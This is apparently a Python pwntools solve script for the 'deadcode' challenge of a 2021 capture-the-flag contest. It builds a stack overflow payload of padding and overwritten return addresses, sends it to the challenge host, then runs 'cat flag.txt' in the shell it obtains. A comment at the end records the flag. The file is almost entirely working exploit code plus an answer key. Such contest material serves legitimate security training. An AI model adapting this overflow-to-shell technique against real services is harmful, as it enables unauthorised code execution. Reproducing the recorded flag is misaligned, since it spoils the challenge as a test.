import time
import sys
import os
sys.path.append(f'{os.getcwd()}'+'/../../utils/')
from utils import ChalIO
from Crypto.Util.number import long_to_bytes,bytes_to_long
from pwn import *
def _(args, end='\n',fn=None):
    if fn==print:
        fn(args,end=end)
    return
debug = _
local = False
host = 'pwn-2021.duc.tf'
port = 31916
offset = 483
try:
    payload = b'\x41'*20+b'deadcode\0'+11*b'\x00'+p64(int(0x401000+int(f'{hex(offset)[2:]}',16)))*8
    fp = open('out','wb')
    fp.write(payload)
    fp.close()
    p = ChalIO(p=ELF(f'./{"deadcode"}').process(),fio=None,local=local)\
            if local else ChalIO(p=remote(f'{host}',port), fio=None,local=local)
    debug(f'got: {p.recvuntil("?").decode()}') 
    p.sendline(payload)
    if len(p.recvuntil(b'...')):
        p.sendline(b'cat flag.txt')
        flag = (p.recv()+p.recv()).rstrip().decode()
        print(f'got flag:\n{flag}')
except Exception as e:
    print(f'Exception: {e}')
finally:
    pass
# flag: DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv} 
